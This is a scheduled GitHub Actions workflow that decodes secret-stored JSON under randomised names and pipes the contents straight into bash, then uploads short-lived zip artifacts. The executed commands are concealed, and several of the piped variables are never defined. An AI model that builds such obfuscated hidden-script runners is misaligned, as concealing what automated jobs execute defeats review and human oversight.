name: Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '55 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Execute
        env:
          hqs243: ${{ secrets.hqs243 }}
        run: |
          printf '%s' "$hqs243" | jq -r .ucrd19503 | /bin/bash
          printf '%s' "$jc0782" | jq -r .ns024 | /bin/bash
          printf '%s' "$v1553" | jq -r .vw162 | /bin/bash
          echo $yv6084 | jq -r .mug311 | /bin/bash
          printf '%s' "$s22" | jq -r .ecr4 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: GyzJEhCp
          path: "*.zip"
          retention-days: 1
